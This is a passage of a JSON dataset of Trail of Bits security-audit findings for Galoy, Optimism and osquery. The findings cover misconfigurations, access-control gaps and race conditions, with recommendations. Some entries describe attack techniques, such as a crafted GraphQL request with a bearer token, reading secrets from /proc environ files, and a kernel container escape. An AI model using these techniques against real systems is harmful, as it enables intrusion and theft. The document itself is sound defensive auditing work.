Professional with the Param Miner extension to scan the application for hidden parameters.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. Discrepancies in API and GUI access controls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Although the Web Wallets graphical user interface (GUI) does not allow changes to a username (gure 14.1), they can be made through the GraphQL userUpdateUsername mutation (gure 14.2). Figure 14.1: The lock icon on the Settings page indicates that it is not possible to change a username. POST /graphql HTTP / 2 Host: api.freecorn.galoy.io Content-Length: 345 Content-Type: application/json Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiI2MjI3ODYwMWJlOGViYWYxZWRmNDBhNDYiLCJ uZXR3b3JrIjoibWFpbm5ldCIsImlhdCI6MTY0Njc1NzU4NX0.ed2dk9gMQh5DJXCPpitj5wq78n0gFnmulRp 2KIXTVX0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Origin: https://wallet.freecorn.galoy.io { \"operationName\" : \"userUpdateUsername\" , \"variables\" :{ \"input\" :{ \"username\" : \"aaaaaaaaaaaa aaa\" }}, \"query\" : \" mutation userUpdateUsername($input: UserUpdateUsernameInput!) {\\n userUpdateUsername(input: $input) {\\n errors {\\n message\\n __typename\\n }\\n user {\\n id\\n username\\n __typename\\n }\\n __typename\\n }\\n} \" } HTTP/ 2 200 OK // (...) { \"data\" :{ \"userUpdateUsername\" :{ \"errors\" :[], \"user\" :{ \"id\" : \"04f01fb4-6328-5982-a39a-eeb 027a2ceef\" , \"username\" : \"aaaaaaaaaaaaaaa\" , \"__typename\" : \"User\" }, \"__typename\" : \"UserUpdat eUsernamePayload\" }}} Figure 14.2: The HTTP request-response cycle that enables username changes Exploit Scenario An attacker nds a discrepancy in the access controls of the GUI and API and is then able to use a sensitive method that the attacker should not be able to access. Recommendations Short term, avoid relying on client-side access controls. If the business logic of a functionality needs to be blocked, the block should be enforced in the server-side code. Long term, create an access control matrix for specic roles in the application and implement unit tests to ensure that appropriate access controls are enforced server-side.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Cloud SQL does not require TLS connections ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Terraforms declarative conguration le for the Cloud SQL instance does not indicate that PostgreSQL should enforce the use of Transport Layer Security (TLS) connections. Similarly, the Galoy solution does not use the Cloud SQL Auth proxy, which provides strong encryption and authentication using identity and access management. Because the database is exposed only in a virtual private cloud (VPC) network, this nding is of low severity. Exploit Scenario An attacker manages to eavesdrop on trac in the VPC network. If one of the database clients is miscongured, the attacker will be able to observe the database trac in plaintext. Recommendations Short term, congure Cloud SQL to require the use of TLS, or use the Cloud SQL Auth proxy. Long term, integrate Terrascan or another automated analysis tool into the workow to detect areas of improvement in the solution. References   Congure SSL/TLS certicates , Cloud SQL documentation Connect from Google Kubernetes Engine , Cloud SQL documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "16. Kubernetes node pools are not congured to auto-upgrade ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The Galoy application uses Google Kubernetes Engine (GKE) node pools in which the auto-upgrade functionality is disabled. The auto-upgrade functionality helps keep the nodes in a Kubernetes cluster up to date with the Kubernetes version running on the cluster control plane, which Google updates on the users behalf. Auto-upgrades also ensure that security updates are timely applied. Disabling this setting is not recommended by Google and could create a security risk if patching is not performed manually. 124 125 126 management { auto_repair = true auto_upgrade = false 127 } Figure 16.1: The auto-upgrade property is set to false . ( modules/platform/gcp/kube.tf#124127 ) Recommendations Short term, enable the auto-upgrade functionality to ensure that the nodes are kept up to date and that security patches are timely applied. Long term, remain up to date on the security features oered by Google Cloud. Integrate Terrascan or another automated tool into the development workow to detect areas of improvement in the solution. References  Auto-upgrading nodes , GKE documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Overly permissive rewall rules ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The VPC rewall conguration is overly permissive. This conguration, in conjunction with Google Clouds default VPC rules, allows most communication between pods (gure 17.2), the bastion host (gure 17.3), and the public internet (gure 17.1). 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 resource \"google_compute_firewall\" \"bastion_allow_all_inbound\" { project = local.project name = \"${local.name_prefix}-bastion-allow-ingress\" network = google_compute_network.vpc.self_link target_tags = [ local.tag ] direction = \"INGRESS\" source_ranges = [ \"0.0.0.0/0\" ] priority = \"1000\" allow { protocol = \"all\" } 107 } Figure 17.1: The bastion ingress rules allow incoming trac on all protocols and ports from all addresses. ( modules/inception/gcp/bastion.tf#92107 ) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 resource \"google_compute_firewall\" \"intra_egress\" { project = local.project name = \"${local.name_prefix}-intra-cluster-egress\" description = \"Allow pods to communicate with each other and the master\" network = data.google_compute_network.vpc.self_link priority = 1000 direction = \"EGRESS\" target_tags = [ local.cluster_name ] destination_ranges = [ local.master_ipv4_cidr_block , google_compute_subnetwork.cluster.ip_cidr_range , google_compute_subnetwork.cluster.secondary_ip_range[0].ip_cidr_range , ] # Allow all possible protocols allow { protocol = \"tcp\" } allow { protocol = \"udp\" } allow { protocol = \"icmp\" } allow { protocol = \"sctp\" } allow { protocol = \"esp\" } allow { protocol = \"ah\" } 23 } Figure 17.2: Pods can initiate connections to other pods on all protocols and ports. ( modules/platform/gcp/firewall.tf#123 ) 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 resource \"google_compute_firewall\" \"dmz_nodes_ingress\" { name = \"${var.name_prefix}-bastion-nodes-ingress\" description = \"Allow ${var.name_prefix}-bastion to reach nodes\" project = local.project network = data.google_compute_network.vpc.self_link priority = 1000 direction = \"INGRESS\" target_tags = [ local.cluster_name ] source_ranges = [ data.google_compute_subnetwork.dmz.ip_cidr_range , ] # Allow all possible protocols allow { protocol = \"tcp\" } allow { protocol = \"udp\" } allow { protocol = \"icmp\" } allow { protocol = \"sctp\" } allow { protocol = \"esp\" } 63 allow { protocol = \"ah\" } 64 } Figure 17.3: The bastion host can initiate connections to pods on all protocols and ports. ( modules/platform/gcp/firewall.tf#4464 ) Exploit Scenario 1 An attacker gains access to a pod through a vulnerability in an application. He takes advantage of the unrestricted egress trac and miscongured pods to launch attacks against other services and pods in the network. Exploit Scenario 2 An attacker discovers a vulnerability on the Secure Shell server running on the bastion host. She exploits the vulnerability to gain network access to the Kubernetes cluster, which she can then use in additional attacks. Recommendations Short term, restrict both egress and ingress trac to necessary protocols and ports. Document the expected network interactions across the components and check them against the implemented rewall rules. Long term, use services such as the Identity-Aware Proxy to avoid exposing hosts directly to the internet, and enable VPC Flow Logs for network monitoring. Additionally, integrate automated analysis tools such as tfsec into the development workow to detect rewall issues early on. References  Using IAP for TCP forwarding, Identity-Aware Proxy documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Lack of uniform bucket-level access in Terraform state bucket ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Uniform bucket-level access is not enabled in the bootstrap module bucket used to store the Terraform state. When enabled, this feature implements a uniform permission system, providing access at the bucket level rather than on a per-object basis. It also simplies the access controls / permissions of a bucket, making them easier to manage and reason about. 1 2 3 4 5 6 7 8 resource \"google_storage_bucket\" \"tf_state\" { name = \"${local.name_prefix}-tf-state\" project = local.project location = local.tf_state_bucket_location versioning { enabled = true } force_destroy = local.tf_state_bucket_force_destroy 9 } Figure 18.1: The bucket denition lacks a uniform_bucket_level_access eld set to true . ( modules/bootstrap/gcp/tf-state-bucket.tf#19 ) Exploit Scenario The permissions of some objects in a bucket are miscongured. An attacker takes advantage of that fact to access the Terraform state. Recommendations Short term, enable uniform bucket-level access in this bucket. Long term, integrate automated analysis tools such as tfsec into the development workow to identify any similar issues and areas of improvement.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Insecure storage of passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Galoy passwords are stored in conguration les and environment variables or passed in as command-line arguments. There are two issues with this method of storage: (1) the default keys are low entropy (gure 19.1) and (2) the fact that there are default keys in the rst place suggests that users deploying components may not realize that they need to set passwords. 53 export BITCOINDRPCPASS=rpcpassword // (...) 68 export MONGODB_PASSWORD=password // (...) 79 export JWT_SECRET= \"jwt_secret\" Figure 19.1: An example conguration le with passwords ( .envrc#5379 ) Passing in sensitive values through environment variables (gure 19.2) increases the risk of a leak for several reasons:    Environment variables are often dumped to external services through crash-logging mechanisms. All processes started by a user can read environment variables from the /proc/$pid/environ le. Attackers often use this ability to dump sensitive values passed in through environment variables (though this requires nding an arbitrary le read vulnerability in the application). An application can also overwrite the contents of a special /proc/$pid/environ le. However, overwriting the le is not as simple as calling setenv(SECRET, \"******\") , because runtimes copy environment variables upon initialization and then operate on the copy. To clear environment variables from that special environ le, one must either overwrite the stack data in which they are located or make a low-level prctl system call with the PR_SET_MM_ENV_START and PR_SET_MM_ENV_END ags enabled to change the memory address of the content the le is rendered from. 12 const jwtSecret = process.env.JWT_SECRET Figure 19.2: src/config/process.ts#12 Certain initialization commands take a password as a command-line argument (gures 19.3 and 19.4). If an attacker gained access to a user account on a system running the script, the attacker would also gain access to any password passed as a command-line argument. 65 66 command : [ '/bin/sh' ] args : 67 - '-c' 68 - | 69 70 71 72 73 if [ ! -f /root/.lnd/data/chain/bitcoin/${NETWORK}/admin.macaroon ]; then while ! test -f /root/.lnd/tls.cert; do sleep 1; done apk update; apk add expect /home/alpine/walletInit.exp ${NETWORK} $LND_PASS fi Figure 19.3: charts/lnd/templates/statefulset.yaml#6573 55 set PASSWORD [lindex $argv 1]; Figure 19.4: charts/lnd/templates/wallet-init-configmap.yaml#55 In Linux, all users can inspect other users commands and their arguments. A user can enable the proc lesystem's hidepid=2 gid=0 mount options to hide metadata about spawned processes from users who are not members of the specied group. However, in many Linux distributions, those options are not enabled by default. Recommendations Short term, take the following actions:   Remove the default encryption keys and avoid using any one default key across installs. The user should be prompted to provide a key when deploying the Galoy application, or the application should generate a key using known-good cryptographically secure methods and provide it to the user for safekeeping. Avoid storing encryption keys in conguration les. Conguration les are often broadly readable or rendered as such accidentally. Long term, ensure that keys, passwords, and other sensitive data are never stored in plaintext in the lesystem, and avoid providing default values for that data. Also take the following steps:    Document the risks of providing sensitive values through environment variables. Encourage developers to pass sensitive values through standard input or to use a launcher that can fetch them from a service like HashiCorp Vault. Allow developers to pass in those values from a conguration le, but document the fact that the conguration le should not be saved in backups, and provide a warning if the le has overly broad permissions when the program is started.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Third-party container images are not version pinned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The continuous integration (CI) pipeline and Helm charts reference third-party components such as Docker registry images by named tags (or by no tag at all). Registry tags are not immutable; if an attacker compromised an image publishers account, the pipeline or Kubernetes cluster could be provided a malicious container image. 87 - name : build-chain-dl-image 88 89 90 91 92 93 94 95 96 97 98 serial : true plan : - { get : chain-dl-image-def , trigger : true } - task : build privileged : true config : platform : linux image_resource : type : registry-image source : repository : vito/oci-build-task Figure 20.1: A third-party image referenced without an explicit tag ( ci/pipeline.yml#8798 ) 270 resource_types : 271 - name : terraform 272 273 274 275 type : docker-image source : repository : ljfranklin/terraform-resource tag : latest Figure 20.2: An image referenced by the latest tag ( ci/pipeline.yml#270275 ) Exploit Scenario An attacker gains access to a Docker Hub account hosting an image used in the CI pipeline. The attacker then tags a malicious container image and pushes it to Docker Hub. The CI pipeline retrieves the tagged malicious image and uses it to execute tasks. Recommendations Short term, refer to Docker images by SHA-256 digests to prevent the use of an incorrect or modied image. Long term, integrate automated tools such as Checkov into the development workow to detect similar issues in the codebase.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Compute instances do not leverage Shielded VM features ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The bastion host denition does not enable all of Google Clouds Shielded VM (virtual machine) features for Compute Engine VM instances. These features provide veriable integrity of VM instances and assurance that VM instances have not been compromised by boot- or kernel-level malware or rootkits. Three features provide this veriable integrity: Secure Boot, virtual trusted platform module (vTPM)-enabled Measured Boot, and integrity monitoring. Google also oers Shielded GKE nodes, which are built on top of Shielded VMs and provide strong veriable node identity and integrity to increase the security of GKE nodes. The node pool denition does enable this feature but disables Secure Boot checks on the node instances. 168 169 170 shielded_instance_config { enable_secure_boot = false enable_integrity_monitoring = true 171 } Figure 21.1: Secure Boot is disabled. ( modules/platform/gcp/kube.tf#168171 ) Exploit Scenario The bastion host is compromised, and persistent kernel-level malware is installed. Because the bastion host is still operational, the malware remains undetected for an extended period. Recommendations Short term, enable these security features to increase the security and trustworthiness of the infrastructure. Long term, integrate automated analysis tools such as tfsec into the development workow to detect other areas of improvement in the solution. References   What is Shielded VM? , Compute Engine documentation Using GKE Shielded Nodes, GKE documentation",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Excessive container permissions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "Kubernetes containers launch processes under user and group IDs corresponding to users and groups on the host system. Container processes that are running as root usually have more permissions than their workload requires. If such a process were compromised, the permissions would enable the attacker to perform further attacks against the container or host. Kubernetes provides several ways to further limit these permissions, such as disabling the allowPrivilegeEscalation ag to ensure that a child process of a container cannot gain more privileges than its parent, dropping all Linux capabilities, and enforcing Seccomp and AppArmor proles. We found several instances of containers run as root, with allowPrivilegeEscalation enabled by omission (gure 22.1) or with low user IDs that overlap with host user IDs (gure 22.2). In some of the containers, Linux capabilities were not dropped (gure 22.2), and neither Seccomp nor AppArmor proles were enabled. 24 containers : 25 - name : auth-backend 26 27 28 29 30 image : \"{{ .Values.image.repository }}@{{ .Values.image.digest }}\" ports : - containerPort : 3000 env : - (...) Figure 22.1: Without a securityContext eld, commands will run as root and a container will allow privilege escalation by default. ( charts/galoy-auth/charts/auth-backend/templates/deployment.yaml#2430 ) 38 39 40 41 42 43 44 45 securityContext : # capabilities: # drop: # - ALL readOnlyRootFilesystem : true runAsNonRoot : true runAsUser : 1000 runAsGroup : 3000 Figure 22.2: User ID 1000 is typically used by the rst non-system user account. ( charts/bitcoind/values.yaml#3845 ) Exploit Scenario An attacker is able to trigger remote code execution in the Web Wallet application. The attacker then leverages the lax permissions to exploit CVE-2022-0185, a buer overow vulnerability in the Linux kernel that allows her to obtain root privileges and escape the Kubernetes pod. The attacker then gains the ability to execute code on the host system. Recommendations Short term, review and adjust the securityContext conguration of all charts used by the Galoy system. Run pods as non-root users with high user IDs that will not overlap with host user IDs. Drop all unnecessary capabilities, and enable security policy enforcement when possible. Long term, integrate automated tools such as Checkov into the CI pipeline to detect areas of improvement in the solution. Additionally, review the Docker recommendations outlined in appendix E . References   Kubernetes container escape using Linux Kernel exploit , CrowdStrike 10 Kubernetes Security Context settings you should understand, snyk",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "23. Unsigned and unversioned Grafana BigQuery Datasource plugin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Galoy.pdf",
        "description": "The BigQuery Datasource plugin is installed as part of the Grafana conguration found in the Helm charts. The plugin, which is unsigned, is pulled directly from the master branch of the doitintl/bigquery-grafana GitHub repository, and signature checks for the plugin are disabled. Grafana advises against running unsigned plugins. 10 11 plugins : - https://github.com/doitintl/bigquery-grafana/archive/master.zip ;doit-bigquery-dataso urce 12 13 14 15 grafana.ini : plugins : allow_loading_unsigned_plugins : \"doitintl-bigquery-datasource\" Figure 23.1: The plugin is downloaded directly from the GitHub repository, and signature checks are disabled. ( charts/monitoring/values.yaml#1015 ) Exploit Scenario An attacker compromises the doitintl/bigquery-grafana repository and pushes malicious code to the master branch. When Grafana is set up, it downloads the plugin code from the master branch. Because unsigned plugins are allowed, Grafana directly loads the malicious plugin. Recommendations Short term, install the BigQuery Datasource plugin from a signed source such as the Grafana catalog, and disallow the loading of any unsigned plugins. Long term, review the vendor recommendations when conguring new software and avoid disabling security features such as signature checks. When referencing external code and software releases, do so by immutable hash digests instead of named tags or branches to prevent unintended modications. References  Plugin Signatures , Grafana Labs 24. Insu\u0000cient validation of JWTs used for GraphQL subscriptions Severity: Low Diculty: Low Type: Authentication Finding ID: TOB-GALOY-24 Target: galoy/src/servers/graphql-server.ts",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Risk of miscongured GasPriceOracle state variables that can lock L2 ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-11-optimism-securityreview.pdf",
        "description": "When bootstrapping the L2 network operated by op-geth , the GasPriceOracle contract is pre-deployed to L2, and its contract state variables are used to specify the L1 costs to be charged on L2. Three state variables are used to compute the costs decimals , overhead , and scalar which can be updated through transactions sent to the node. However, these state variables could be miscongured in a way that sets gas prices high enough to prevent transactions from being processed. For example, if overhead were set to the maximum value, a 256-bit unsigned integer, the subsequent transactions would not be accepted. In an end-to-end test of the above example, contract bindings used in op-e2e tests (such as the GasPriceOracle bindings used to update the state variables) were no longer able to make subsequent transactions/updates, as calls to SetOverhead or SetDecimals resulted in a deadlock. Sending a transaction directly through the RPC client did not produce a transaction receipt that could be fetched. Recommendations Short term, implement checks to ensure that GasPriceOracle parameters can be updated if fee parameters were previously miscongured. This could be achieved by adding an exception to GasPriceOracle fees when the contract owner calls methods within the contract or by setting a maximum fee cap. Long term, develop operational procedures to ensure the system is not deployed in or otherwise entered into an unexpected state as a result of operator actions. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Project dependencies are not monitored for vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The osquery project depends on a large number of dependencies to realize the functionality of the existing tables. They are included as Git submodules in the project. The build mechanism of each dependency has been rewritten to suit the specic needs of osquery (e.g., so that it has as few dynamically loaded libraries as possible), but there is no process in place to detect published vulnerabilities in the dependencies. As a result, osquery could continue to use code with known vulnerabilities in the dependency projects. Exploit Scenario An attacker, who has gained a foothold on a machine running osquery, leverages an existing vulnerability in a dependency to exploit osquery. He escalates his privileges to those of the osquery agent or carries out a denial-of-service attack to block the osquery agent from sending data. Recommendations Short term, regularly update the dependencies to their latest versions. Long term, establish a process within the osquery project to detect published vulnerabilities in its dependencies. 15 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. No separation of privileges when executing dependency code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "In several places in the codebase, the osquery agent realizes the functionality of a table by invoking code in a dependency project. For example, the yara table is implemented by invoking code in libyara. However, there is no separation of privileges or sandboxing in place when the code in the dependency library is called, so the library code executes with the same privileges as the osquery agent. Considering the projects numerous dependencies, this issue increases the osquery agents attack surface and would exacerbate the eects of any vulnerabilities in the dependencies. Exploit Scenario An attacker nds a vulnerability in a dependency library that allows her to gain code execution, and she elevates her privileges to that of the osquery agent. Recommendations Short term, regularly update the dependencies to their latest versions. Long term, create a security barrier against the dependency library code to minimize the impact of vulnerabilities. 16 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. No limit on the amount of information that can be read from the Firefox add-ons table ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The implementation of the Firefox add-ons table has no limit on the amount of information that it can read from JSON les while enumerating the add-ons installed on a user prole. This is because to directly read and parse the Firefox prole JSON le, the parseJSON implementation in the osquery agent uses boost::property_tree, which does not have this limit. pt::ptree tree; if (!osquery::parseJSON(path + kFirefoxExtensionsFile, tree).ok()) { TLOG << \"Could not parse JSON from: \" << path + kFirefoxExtensionsFile; return; } Figure 3.1: The osquery::parseJSON function has no limit on the amount of data it can read. Exploit Scenario An attacker crafts a large, valid JSON le and stores it on the Firefox prole path as extensions.json (e.g., in ~/Library/Application Support/Firefox/Profiles/foo/extensions.json on a macOS system). When osquery executes a query using the firefox_addons table, the parseJSON function reads and parses the complete le, causing high resource consumption. Recommendations Short term, enforce a maximum le size within the Firefox table, similar to the limits on other tables in osquery. Long term, consider removing osquery::parseJSON and implementing a single, standard way to parse JSON les across osquery. The osquery project currently uses both boost::property_tree and RapidJSON libraries to parse JSON les, resulting in the use of dierent code paths to handle untrusted content. 17 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. The SIP status on macOS may be misreported ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "If System Integrity Protection (SIP) is disabled on a Mac running osquery, the SIP conguration table might not report the correct value in the enabled column for the config_flag: sip row. For this misreporting to happen, extra ags need to be present in the value returned by csr_get_active_config and absent in the osquery kRootlessConfigFlags list. This is the case for the ags CSR_ALLOW_ANY_RECOVERY_OS, CSR_ALLOW_UNAPPROVED_KEXTS, CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE, and CSR_ALLOW_UNAUTHENTICATED_ROOT in xnu-7195.141.2/bsd/sys/csr.h (compare gure 4.1 and gure 4.3). /* CSR configuration flags */ #define CSR_ALLOW_UNTRUSTED_KEXTS (1 << 0) #define CSR_ALLOW_UNRESTRICTED_FS (1 << 1) #define CSR_ALLOW_TASK_FOR_PID (1 << 2) #define CSR_ALLOW_KERNEL_DEBUGGER (1 << 3) #define CSR_ALLOW_APPLE_INTERNAL (1 << 4) #define CSR_ALLOW_DESTRUCTIVE_DTRACE (1 << 5) /* name deprecated */ #define CSR_ALLOW_UNRESTRICTED_DTRACE (1 << 5) #define CSR_ALLOW_UNRESTRICTED_NVRAM (1 << 6) #define CSR_ALLOW_DEVICE_CONFIGURATION (1 << 7) #define CSR_ALLOW_ANY_RECOVERY_OS (1 << 8) #define CSR_ALLOW_UNAPPROVED_KEXTS (1 << 9) #define CSR_ALLOW_EXECUTABLE_POLICY_OVERRIDE (1 << 10) #define CSR_ALLOW_UNAUTHENTICATED_ROOT (1 << 11) Figure 4.1: The CSR ags in xnu-7159.141.2 18 Atlassian: osquery Security Assessment QueryData results; csr_config_t config = 0; csr_get_active_config(&config); csr_config_t valid_allowed_flags = 0; for (const auto& kv : kRootlessConfigFlags) { valid_allowed_flags |= kv.second; } Row r; r[\"config_flag\"] = \"sip\"; if (config == 0) { // SIP is enabled (default) r[\"enabled\"] = INTEGER(1); r[\"enabled_nvram\"] = INTEGER(1); } else if ((config | valid_allowed_flags) == valid_allowed_flags) { // mark SIP as NOT enabled (i.e. disabled) if // any of the valid_allowed_flags is set r[\"enabled\"] = INTEGER(0); r[\"enabled_nvram\"] = INTEGER(0); } results.push_back(r); Figure 4.2: How the SIP state is computed in genSIPConfig // rootless configuration flags // https://opensource.apple.com/source/xnu/xnu-3248.20.55/bsd/sys/csr.h const std::map<std::string, uint32_t> kRootlessConfigFlags = { // CSR_ALLOW_UNTRUSTED_KEXTS {\"allow_untrusted_kexts\", (1 << 0)}, // CSR_ALLOW_UNRESTRICTED_FS {\"allow_unrestricted_fs\", (1 << 1)}, // CSR_ALLOW_TASK_FOR_PID {\"allow_task_for_pid\", (1 << 2)}, // CSR_ALLOW_KERNEL_DEBUGGER {\"allow_kernel_debugger\", (1 << 3)}, // CSR_ALLOW_APPLE_INTERNAL {\"allow_apple_internal\", (1 << 4)}, // CSR_ALLOW_UNRESTRICTED_DTRACE {\"allow_unrestricted_dtrace\", (1 << 5)}, // CSR_ALLOW_UNRESTRICTED_NVRAM {\"allow_unrestricted_nvram\", (1 << 6)}, // CSR_ALLOW_DEVICE_CONFIGURATION {\"allow_device_configuration\", (1 << 7)}, }; Figure 4.3: The ags currently supported by osquery 19 Atlassian: osquery Security Assessment Exploit Scenario An attacker, who has gained a foothold with root privileges, disables SIP on a device running macOS and sets the csr_config ags to 0x3e7. When building the response for the sip_config table, osquery misreports the state of SIP. Recommendations Short term, consider reporting SIP as disabled if any ag is present or if any of the known ags are present (e.g., if (config & valid_allowed_flags) != 0). Long term, add support for reporting the raw ag values to the table specication and code so that the upstream server can make the nal determination on the state of SIP, irrespective of the ags supported by the osquery daemon. Additionally, monitor for changes and add support for new ags as they are added on the macOS kernel. 20 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. The OpenReadableFile function can hang on reading a le ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The OpenReadableFile function creates an instance of the PlatformFile class, which is used for reading and writing les. The constructor of PlatformFile uses the open syscall to obtain a handle to the le. The OpenReadableFile function by default opens the le using the O_NONBLOCK ag, but if PlatformFiles isSpecialFile method returns true, it opens the le without using O_NONBLOCK. On the POSIX platform, the isSpecialFile method returns true for les in which fstat returns a size of zero. If the le to be read is a FIFO, the open syscall in the second invocation of PlatformFiles constructor blocks the osquery thread until another thread opens the FIFO le to write to it. struct OpenReadableFile : private boost::noncopyable { public: explicit OpenReadableFile(const fs::path& path, bool blocking = false) : blocking_io(blocking) { int mode = PF_OPEN_EXISTING | PF_READ; if (!blocking) { mode |= PF_NONBLOCK; } // Open the file descriptor and allow caller to perform error checking. fd = std::make_unique<PlatformFile>(path, mode); if (!blocking && fd->isSpecialFile()) { // A special file cannot be read in non-blocking mode, reopen in blocking // mode mode &= ~PF_NONBLOCK; blocking_io = true; fd = std::make_unique<PlatformFile>(path, mode); } } public: std::unique_ptr<PlatformFile> fd{nullptr}; 21 Atlassian: osquery Security Assessment bool blocking_io; }; Figure 5.1: The OpenReadableFile function can block the osquery thread. Exploit Scenario An attacker creates a special le, such as a FIFO, in a path known to be read by the osquery agent. When the osquery agent attempts to open and read the le, it blocks the osquery thread indenitely, in eect making osquery unable to report the status to the server. Recommendations Short term, ensure that the le operations in filesystem.cpp do not block the osquery thread. Long term, introduce a timeout on le operations so that a block does not stall the osquery thread. References  The Single Unix Specication, Version 2 22 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Methods in POSIX PlatformFile class are susceptible to race conditions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
        "description": "The POSIX implementation of the methods in the PlatformFile class includes several methods that return the current properties of a le. However, the properties can change during the lifetime of the le descriptor, so the return values of these methods may not reect the actual properties. For example, the isSpecialFile method, which is used to determine the strategy for reading the le, calls the size method. However, the le size can change between the time of the call and the reading operation, in which case the wrong strategy for reading the le could be used. bool PlatformFile::isSpecialFile() const { return (size() == 0); } static uid_t getFileOwner(PlatformHandle handle) { struct stat file; if (::fstat(handle, &file) < 0) { return -1; } return file.st_uid; } Status PlatformFile::isOwnerRoot() const { if (!isValid()) { return Status(-1, \"Invalid handle_\"); } uid_t owner_id = getFileOwner(handle_); if (owner_id == (uid_t)-1) { return Status(-1, \"fstat error\"); } if (owner_id == 0) { return Status::success(); } return Status(1, \"Owner is not root\"); } Status PlatformFile::isOwnerCurrentUser() const { 23 Atlassian: osquery Security Assessment if (!isValid()) { return Status(-1, \"Invalid handle_\"); } uid_t owner_id = getFileOwner(handle_); if (owner_id == (uid_t)-1) { return Status(-1, \"fstat error\"); } if (owner_id == ::getuid()) { return Status::success(); } return Status(1, \"Owner is not current user\"); } Status PlatformFile::isExecutable() const { struct stat file_stat; if (::fstat(handle_, &file_stat) < 0) { return Status(-1, \"fstat error\"); } if ((file_stat.st_mode & S_IXUSR) == S_IXUSR) { return Status::success(); } return Status(1, \"Not executable\"); } Status PlatformFile::hasSafePermissions() const { struct stat file; if (::fstat(handle_, &file) < 0) { return Status(-1, \"fstat error\"); } // We allow user write for now, since our main threat is external // modification by other users if ((file.st_mode & S_IWOTH) == 0) { return Status::success(); } return Status(1, \"Writable\"); } Figure 6.1: The methods in PlatformFile could cause race issues. Exploit Scenario A new function is added to osquery that uses hasSafePermissions to determine whether to allow a potentially unsafe operation. An attacker creates a le that passes the hasSafePermissions check, then changes the permissions and alters the le contents before the le is further processed by the osquery agent. 24 Atlassian: osquery Security Assessment Recommendations Short term, refactor the operations of the relevant PlatformFile class methods to minimize the race window. For example, the only place hasSafePermissions is currently used is in the safePermissions function, in which it is preceded by a check that the le is owned by root or the current user, which eliminates the possibility of an adversary using the race condition; therefore, refactoring may not be necessary in this method. Add comments to these methods describing possible adverse eects. Long term, refactor the interface of PlatformFile to contain the potential race issues within the class. For example, move the safePermissions function into the PlatformFile class so that hasSafePermissions is not exposed outside of the class. 25 Atlassian: osquery Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. No limit on the amount of data that parsePlist can parse ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/osquery.pdf",
